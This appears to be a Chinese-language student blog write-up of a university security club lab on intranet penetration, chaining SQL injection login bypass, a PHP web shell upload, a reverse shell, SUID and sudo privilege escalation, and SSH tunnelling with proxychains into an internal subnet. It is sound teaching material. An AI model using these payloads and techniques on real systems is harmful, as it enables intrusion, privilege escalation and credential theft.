# [NSYSU 資安社課] Intranet Penetration


久違的社課，這次是 **MacacaHub** 現役成員 @Arikoi 談內網滲透。  
整場聽下來發現自己太多觀念不熟，所以盡可能將過程整理，有任何錯誤還請不吝指教！

<!--more-->

## 事前資訊

由於這堂某種程度算是內網滲透的簡單範例，所以開頭就給了不少資訊。

![ ](https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1650623224/blog-posts/2022-04/21-info-1_n7oj2p.webp)

## 網站資訊收集

出發點是一個簡陋的網站，從選單可以簡單知道該站的基本功能，同時發現 FileUpload 不開放給非 admin 使用者。

![index](https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1650544772/blog-posts/2022-04/21-index_kngc2y.webp)

### SQL Injection

首先我們可以從登入下手，會被導去一個登入頁（沿用之前的社課教材XD），很明顯是個 SQLi 的洞，還附了 Magic 給你 debug。 這時講師提供了一組 `guest:guest` 作為提示，登入後可以發現上方會是 "Welcome guest"。

![guest index](https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1650623566/blog-posts/2022-04/21-index-guest_i9rqap.webp)

如果用 `' or 1=1 -- ` 可以成功登入，但是由於 admin 並不在資料庫第一筆，因此就算條件為 True 也不會是以 admin 登入。這邊的考點要用 `UNION` 的方式繞過，但講師把驗證的部分寫壞了，所以 `admin'; -- ` 可以繞過XD
  
預期解法可以用 `LIMIT 1,1 -- ` 找下一筆查詢結果，或是用 `UNION` 猜欄位數量後，再透過 "Welcome <user>" 來判斷要把 admin 塞在哪一個位置（~~當然全塞也是會過啦~~），密碼可留空。

```mysql {linenos=false}
'UNION SELECT 'a', 'admin', 'a' ; --
```

![admin index](https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1650623566/blog-posts/2022-04/21-index-admin_njth3e.webp)

### Unrestricted File Upload

成功以 admin 登入，下一步可以嘗試上傳檔案。

該功能的用途是上傳圖片並顯示在首頁中，因此若非允許的副檔名會被擋下來。  
~~給各位參考資安社社員們都傳了什麼圖www~~

![index](https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1650544772/blog-posts/2022-04/21-index-isc_csjua0.webp)

上傳後的圖片在首頁點開會發現路徑存在 `./uploads/<filename>.jpg`。  
用 F12 可以從前端找到前端驗證 `fileValidation.js` ，從 source code 可以想到要繞過驗證並嘗試上傳 web shell。（原本在驗題的時候函式似乎沒有放 `const` ，所以可以直接從前端拔掉驗證的部分XD）

![upload](https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1650545038/blog-posts/2022-04/21-upload_lgdmpn.webp)

web shell 的部分並沒有擋太多，用最簡單的 PHP web shell 就行了（副檔名為 `.png`）。

```php {linenos=false}
<?php
    echo shell_exec($_GET['cmd'], '2>&1');
```

驗證繞過的部分，預期解是直接開 Burp Suite 攔截修改副檔名即可。
> 題外話，最新版的 Burp Suite 居然有內建 chrominum 不用另外設定 proxy ，大推!!

![burp](https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1650544772/blog-posts/2022-04/21-burp_uxt84r.webp)

之後可以透過剛剛上傳的檔案路徑執行我們的 web shell。

![ ](https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1650545038/blog-posts/2022-04/21-webshell-whoami_fhxlks.webp)
![ ](https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1650545038/blog-posts/2022-04/21-webshell-ls_d7fw7a.webp)

### Reverse Shell

用 web shell 雖然可以下指令翻閱 web server 底下的檔案，但並不會保留 session ，因此沒辦法 `cd` 到其他路徑。甚至是在 `cat` 一些 php 檔案也不會直接顯示 source code ，這時候就可以用 Reverse Shell 的方式讓 web server 主動向我們連線。

這裡使用 [Reverse Shell Generator](https://www.revshells.com/) 自動產生連線所需要的 code ，要注意的是若沒有實體 IP 的話，講師當時有提供 Kali 可以 SSH 進去用內網 IP（這部分我使用實驗室的實體 IP）。

![reverse shell](https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1650544772/blog-posts/2022-04/21-revshell-gen_k2fdcr.webp)

在 Host 使用右上的指令進行 LISTEN。  
在 web shell 使用下方的指令，左側可以依據 server 選擇連線工具（有時候需要多測幾個，這裡用 `nc -c` 可以成功連線）。

成功的話 Local 就會彈出 Reverse Shell ，可以下一些指令挖看看有什麼有趣的資訊。

![revshell-ls](https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1650624037/blog-posts/2022-04/21-revshell-ls_nt0lqn.webp)

可以發現一些網站的 source code，其中在 `login.php` 可以進一步翻到寫在 `connect.php` 的 資料庫 資訊。 有了資料庫的登入資訊，也確認有 `mysql` 可用，就可以直接用指令翻資料庫的內容了，格式如下。

```bash {linenos=false}
$ mysql –h SERVER –u USER –pPASSWORD DATABASE -e "show tables;"
```

{{< admonition type=warning title="關於 `mysql` 幾個雷點" >}}
1. 密碼的部分 `-pPASSWORD` 中間沒有空白。
1. 由於指令打錯不會噴任何訊息，建議要加 `-e "<command>;"`，同時分號記得掛上去。
{{< /admonition >}}

![revshell-mysql](https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1650624413/blog-posts/2022-04/21-revshell-mysql_xcyhmd.webp)

> MacacaHub{db-secret-2553a38af63eb376ba770668e81045dc}

在資料庫除了拿到 Flag， 還順便撿到了一組可登入的使用者 `macaca:mhub`（關於這個使用者的存在，可以透過指令 `last` 或 `/etc/passwd` 觀察）。

{{< admonition type=danger title="危險" >}}
弱密碼 Bad ， 而且資料庫勿存密碼明文。
{{< /admonition >}}

另外還可以用 `ip addr` 瞭解網卡資訊，可以看到除了目前網段 `10.0.20.0/24` ，還有之後會用到內網網段 `10.255.0.0/24`。

![revshell-ip](https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1650624810/blog-posts/2022-04/21-revshell-ip_s40scn.webp)


### SUID Privilege Escalation

在 web server 裡除了一些 PHP 的 source code，還有一個令人感興趣的 `.c`，這個其實是能在 Linux 利用環境變數的 SUID 提權，但有鑒於社課時間不夠，這部分就被講師跳過了有點可惜QQ 有興趣可以參考 [Linux提权之SUID](https://mochazz.github.io/2018/06/09/Linux%E6%8F%90%E6%9D%83%E4%B9%8BSUID/#%E4%BB%8B%E7%BB%8D)

起手式，檢查有沒有奇怪的檔案，這裡用 `find` 找到具有 SUID 權限的程式 `showErrorLog`。

```bash {linenos=false}
$ find . -perm -u=s -type f 2>/dev/null
```

![ ](https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1650621046/blog-posts/2022-04/21-suid-pe-1_q0jac3.webp)

根據講師提供 `.c` source code，可以發現程式為了用 `tail` 存取 `/var/log/` 底下需要 root 權限的檔案，前面掛上了 SUID 。 這時候我們可以利用偽造 `tail` 並加入環境變數的方式，讓  `showErrorLog` 執行我們想要的指令，具體作法如下。

1. 找一個可以寫入的目錄，最常被拿來寫入的是 `/tmp` ，因此我們把 "`/bin/bash`" 寫進 `/tmp/tail`，並寫給他執行權限 777（或是 +x 也行）。
2. 把目錄 `/tmp` 寫進環境變數 `$PATH`。

如此一來，執行 `showErrorLog` 後系統會先找到存放在 `/tmp` 的 `tail`，並且執行 `/bin/bash` ，直接取得 root 的 shell !!

> 下圖為了方便截圖，重開新的 session，並分段提高可讀性（Ｏ

![ ](https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1650621046/blog-posts/2022-04/21-suid-pe-2_t9a3rb.webp)

找到在 `/root` 偷埋的 flag。
> MacacaHub{env-privilege-b68a4679b5a2e1aaa00dc3ffa8ed429c}

## 內網滲透

### SSH Tunneling

一般來說，SSH 是被允許通過防火牆或是 DMZ ，而且 SSH 的傳輸過程都是加密的，因此很容易被駭客拿來利用，在這次社課主要就是以 SSH Tunneling 搭配之後的 ProxyChains 來透過 web server 進入內網。關於 SSH Tunneling 這裡只介紹 Dynamic Port Forwarding，其他有興趣的可以參考 [SSH Tunneling (Port Forwarding) 詳解](https://johnliu55.tw/ssh-tunnel.html)。

#### Dynamic Port Forwarding

由於我們等等需要以 nmap 掃內網，因此選擇 Dynamic Port Forwarding 在 web server 啟動 SOCKS 代理伺服器，這樣就能以不指定 Port 的方式用 nmap 找有開啟服務的 Port。至於要登入的帳號就是前面從資料庫撿到的 `macaca:mhub`。

```bash {linenos=false}
(host)$ ssh -D [client:]<port> <SSH server>
```

{{< admonition type=note title="小提醒" >}}
1. 由於講師整個服務只有 Port 80 對外開放，因此需要透過 VPN 先跳 DMZ 進去再建 SSH Tunneling，之後如果 web server 有開 SSH 就不用 VPN 了。
1. SSH Tunneling 這裡只負責建立通道，因此 SSH 參數可以加上 `-N` 不顯示其他 prompt 資訊（可以比較下圖和之後 `ProxyChains` 的作法）。
1. ProxyChains 預設走 Port 9050，因此在 SSH 連線直接 bind Port 9050。 若要用其他的 Port ，可以到 `/etc/proxychains.conf` 修改。
{{< /admonition >}}

這邊都在 host 下指令，可以開兩個 terminal 進行觀察（這邊我用 `tmux` 切成左右畫面）。  
左邊的畫面先使用 WireGuard VPN 跳進 DMZ，然後進行 Dynamic Port Forwarding，輸入密碼後就成功建立 SSH Tunneling，之後卡著不用動。
之後的操作主要都是以右邊的畫面為主，可以先用 `netstat` 檢查看看是否有在 LISTEN Port 9050。

![ ](https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1650604912/blog-posts/2022-04/21-ssh-tunneling-d_zapun5.webp)

{{< admonition type=info title="2022.4.26 UPDATE" >}}
老實說，拿到 web shell 後還要 VPN 跳到 DMZ 建 SSH tunneling 這件事，不是很 real world。

課堂上原本有教使用 SSH remote 的連線方式，在拿到 web shell / reverse shell 從 web server 主動向 local 建立 SSH tunneling，但是會遇到 SSH 需要輸入密碼的互動環節而卡關，這個問題可以搭配 [passh](https://github.com/clarkwang/passh) 連同密碼直接向 local 建立 SSH tunneling （~~但明文密碼會不會被網管反過來利用就不好說了，保重~~）。

此外，也可以用 SSH 以外的方式建立 tunneling，例如 [reGeorg](https://github.com/L-codes/Neo-reGeorg)，重點就是如何讓 local 和 DMZ 之間建立連線，再透過 ProxyChains 滲透到內網中。
{{< /admonition >}}

### ProxyChains

成功建立 SSH Tunneling 後，我們就能藉由 ProxyChains 透過 host 的 Port 9050 下指令到 web server。

![ ](https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1650623224/blog-posts/2022-04/21-info-2_sd9b09.webp)

我們可以用之前在 reverse shell 撿到的內網網段 `10.255.0.0/24` ，在右邊畫面使用 nmap 掃掃看有沒有開 Port 22 的主機。

```bash {linenos=false}
(host)$ proxychains nmap -p 22 10.255.0.0/24 --open
```

使用情況如下圖，可以發現左邊也會收到 nmap 的結果，此屬正常情況（若覺得礙眼，也可以在建 SSH Tunneling 階段用 `-f` 放到背景執行）。

![ ](https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1650604913/blog-posts/2022-04/21-proxychains-nmap-all_j6a8aa.webp)


直接掃應該會需要不少時間，何況 nmap 掃 IP 居然是跳著掃Orz  
沒意外的話，最後可以掃到 10.255.0.10 有開 Port 22 服務。

![ ](https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1650604912/blog-posts/2022-04/21-proxychains-nmap-target_bj36oc.webp)

如此一來我們就可以利用 ProxyChains 直接 SSH 連進內網主機了。

![ ](https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1650604912/blog-posts/2022-04/21-proxychains-ssh-target_amcnbz.webp)


課程至此完成內網滲透，之後就是從內網主機的資訊決定下一步要怎麼走了。

## Bonus

### Another Privilege Escalation

原本是講師覺得內網沒東西很奇怪，所以硬是放了一個神奇的提權漏洞，有興趣可以參考 [Linux Privilege Escalation using Sudo Rights](https://www.hackingarticles.in/linux-privilege-escalation-using-exploiting-sudo-rights/)。事實上社課也是把前面的 SUID 提權跳過才勉強講完，真的是蠻可惜的QQ

首先，進入內網主機後，用 `sudo -l` 查看 macaca 可以執行的指令，發現有幾個限定的指令包括 `less`、`man`、`python`、`perl`。  
先隨便生個檔案，並且用 `sudo less` 開啟檔案。

![ ](https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1650613002/blog-posts/2022-04/21-bonus-sudo_yjdbta.webp)

因為 `less` 可以用 `!` 接 shell command，所以可以直接在裡頭下指令 `!/bin/bash`，同時由於是用 `sudo` 執行，所以 Enter 後就會直接拿到 root 的 `/bin/bash` 了。  
~~（畫面很空，給各位看看星姐的美圖）~~

![ ](https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1650613002/blog-posts/2022-04/21-bonus-sudo-less_dxufu4.webp)

確認取得 root 後就能去拿 `/root` 底下的 flag 。
> MacacaHub{sudo-privilege-bf614797197ac53ee9785ee8c22a7d38}

![ ](https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1650618071/blog-posts/2022-04/21-bonus-get-root_kwzv5q.webp)

用 python 和 perl 的道理也一樣，透過 `sudo` 權限執行 `/bin/bash` 拿到 root，如下。
```bash {linenos=false}
$ sudo python -c "import os; os.system('/bin/bash')"
```

## 後記
內網滲透通常是需要好幾個技巧串起來才能夠完成，整體看下來雖然好像很單純順利，但其實很多觀念要理解也不容易，至少我光是在 SSH Tunneling 的四種連線方式摸了很久才大概看懂，所以趁這次社課把一些過程筆記下來，或許哪天不小心碰到也說不定。
